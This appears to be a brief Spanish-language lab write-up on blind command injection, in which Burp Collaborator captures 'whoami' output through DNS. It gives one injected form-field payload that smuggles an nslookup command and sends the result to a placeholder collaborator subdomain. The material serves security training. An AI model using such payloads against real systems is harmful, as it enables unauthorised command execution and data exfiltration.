# Inyección ciega con exfiltración vía OOB

Tags: #CommandInjection #RCE #BurpSuite 

```bash 
En este lab se explota una inyección de comandos ciega aprovechando una técnica avanzada de exfiltración de datos mediante consultas DNS a un dominio controlado. Usamos Burp Collaborator para lanzar un 'whoami' y capturar el resultado directamente en el subdominio generado, demostrando cómo extraer información sensible incluso cuando no hay salida directa del comando.

Una técnica útil en escenarios reales donde la visibilidad está limitada pero aún es posible recuperar datos.
```

```bash 
❯ name=test ; nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN ; &email


Notas:
	1. Se necesita BurpSuite Pro 
```